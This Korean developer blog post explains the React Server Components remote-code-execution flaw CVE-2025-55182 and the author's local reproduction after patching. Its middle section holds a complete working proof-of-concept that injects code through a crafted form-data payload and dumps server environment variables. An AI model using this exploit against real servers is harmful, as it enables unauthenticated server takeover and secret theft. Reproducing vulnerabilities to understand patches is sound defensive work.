---
layout: post
title:  React2Shell 보안 이슈
date:   2025-12-28
image:  React.png
tags:   REACT
---

지난 12월 3일, React 공식 블로그를 통해 React Server Components(RSC)의 치명적인 보안 취약점인 CVE-2025-55182 관한 공지가 [포스팅](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)되었다.

당시 사내 개발팀 슬랙(Slack)에서도 해당 이슈가 긴급히 공유되었고, 우리 팀은 서비스 안전성을 위해 즉각적인 버전 업데이트를 완료했다.

이번 포스팅에서는 단순한 대응을 넘어, 당시 발생했던 보안 이슈의 실체가 무엇이었는지, 그리고 해당 버전에서 어떤 기술적 결함이 있었는지 상세히 정리해 보고자 한다.

---

# 버그 리포트 발표 후 대응

![캡쳐_이미지1](https://californialuv.github.io/Tech_Blog/images/2025-12-28/1.png)
*React2Shel 이슈*

지난 3~4년간 React를 주력 프레임워크로 활용해오며 수많은 업데이트를 마주했지만, 이번처럼 초유의 보안 사태는 처음이었다.

위험 등급 스코어가 무려 ___10.0___ 이 나왔는데 이정도 점수는 나오기도 힘들다고 들었다. (= 박평식 평론가 별점 5개 급)

React 개발팀의 해결책은 버전 업데이트 요구를 발표하였다.

홈페이지부터 웹앱 기반 서비스까지 React로 긴밀하게 연결되어 있어, 사소한 업데이트가 자칫 예상치 못한 장애로 이어질 수 있었기 때문인데
이를 방지하기 위해 개발팀원들과 함께 3시간에 걸쳐 QA를 집중적으로 실시하며 꼼꼼히 체크했다.

긴급 대응을 마친 뒤, 단순히 업데이트를 완료했다는 사실에 안주하기보다 취약점의 발생 메커니즘을 심도 있게 이해하고 싶었다.

발표된 바에 따르면 본 취약점은 아래와 같다.

```
1. 인증 절차를 거치지 않고도 서버 권한을 탈취할 수 있는 '임의 코드 실행(RCE)'이 가능
2. 기본 설정 상태에서도 위험에 노출된다는 점에서 매우 위협
```

실제 어떤 경로로 공격이 이루어질 수 있는지 확인하기 위해 로컬 환경에서 재현 테스트를 해보기로 하였다.

---

# 예제 코드를 통한 문제점 테스트

![캡쳐_이미지2](https://californialuv.github.io/Tech_Blog/images/2025-12-28/4.png)
*버그 최초 발견자 lachlan2k Poc 문서*

최초 제보자인 ___lachlan2k___ 가 [깃허브에 공개한 PoC 코드](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)를 바탕으로, 해당 취약점을 통해 React 서버의 .env 파일 내용이 유출되거나 실행될 수 있는지 직접 검증해 보았다.

예제 코드는 아래와 같다.

{% highlight js %}

const payload = {
  0: "$1",
  1: {
    status: "resolved_model",
    reason: 0,
    _response: "$4",
    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
    then: "$2:then",
  },
  2: "$@3",
  3: [],
  4: {
    _prefix: "console.log('해킹_테스트');console.log(process.env)//",
    _formData: {
      get: "$3:constructor:constructor",
    },
    _chunks: "$2:_response:_chunks",
  },
};

const FormDataLib = require("form-data");

const fd = new FormDataLib();

for (const key in payload) {
  fd.append(key, JSON.stringify(payload[key]));
}

console.log(fd.getBuffer().toString());

console.log(fd.getHeaders());

function exploitNext(baseUrl) {
  fetch(baseUrl, {
    method: "POST",
    headers: {
      "next-action": "x",
      ...fd.getHeaders(),
    },
    body: fd.getBuffer(),
  })
    .then((x) => {
      console.log("fetched", x);
      return x.text();
    })
    .then((x) => {
      console.log("got", x);
    });
}

exploitNext("http://localhost:3000");

{% endhighlight %}

![캡쳐_이미지3](https://californialuv.github.io/Tech_Blog/images/2025-12-28/2.png)
*환경변수*

먼저 .env 파일에 SECRET_CODE 환경 변수를 설정 이후 예제 스크립트를 실행한 결과, 
리액트 서버가 구동 중인 터미널에서 다음과 같이 해당 환경 변수가 출력되는 로그를 확인할 수 있었다.

![캡쳐_이미지4](https://californialuv.github.io/Tech_Blog/images/2025-12-28/3.png)
*React 서버 터미널*

환경변수 전부 출력되며 특히 env 셋팅한 환경변수 까지 유출된 것을 볼 수 있다... (ㄷㄷ)

React 서버 터미널에 process.env 전체가 노출된다는 것은 외부 요청이 서버 실행 컨텍스트에 영향을 미칠 수 있음을 의미한다.

이는 단순한 설정 값 노출이 아니라, 인증·권한·외부 서비스 접근을 포함한 서버 전반의 보안 경계가 무너진 상태로,
실질적인 서버 장악 직전 단계로 분류된다.


---

# 결론

이번 이슈는 업데이트 자체로 해결된 것이 맞다.

다만 그 필요성과 효과를 단순히 “버전이 올라갔으니 해결됐다”라고 받아들이는 데서 그치지 않고,
취약한 버전으로 환경을 구성해 문제를 직접 재현하고, 패치 전후를 비교해 검증했다는 점에서 더 큰 의미가 있었다.

관련 버그 리포트 문서를 찾아보고, 보고된 PoC 예제 코드를 실제로 따라가며 테스트한 결과,
취약 버전에서는 서버 실행 환경이 외부 요청에 의해 영향을 받을 수 있다는 사실을 직접 확인할 수 있었다.

이번 경험을 통해, 보안 이슈에 대해서는 결과만 확인하는 것이 아니라 취약점의 작동 원리를 이해하고 직접 검증해보는 과정이 중요하다는 점을 다시금 느끼게 되었다.

---

# 보안 문제 업데이트

![캡쳐_이미지5](https://californialuv.github.io/Tech_Blog/images/2025-12-28/5.png)
*추가 보고된 버그 리포트*

___React2Shell___ 이슈가 공개된 이후, 며칠 지나지 않아 React Server Components와 관련된 추가 보안 문제들도 연이어 보고되었다.

여기에는 특정 요청으로 서버를 응답 불능 상태로 만들 수 있는 서비스 거부(DoS) 이슈와, 조건에 따라 서버 내부 코드가 노출될 수 있는 문제 등이 포함되어 있었다.

이는 단일 취약점이 아닌, RSC 전반의 보안 안정성에 대한 점검이 필요함을 시사한다. 

계속 react의 불안 요소들이 반복되는 지금, 'Svelte의 붐은 올 것인가'라는 질문이 문득 머릿속을 스친다. (언제든 갈아탈 준비를 하자!!)
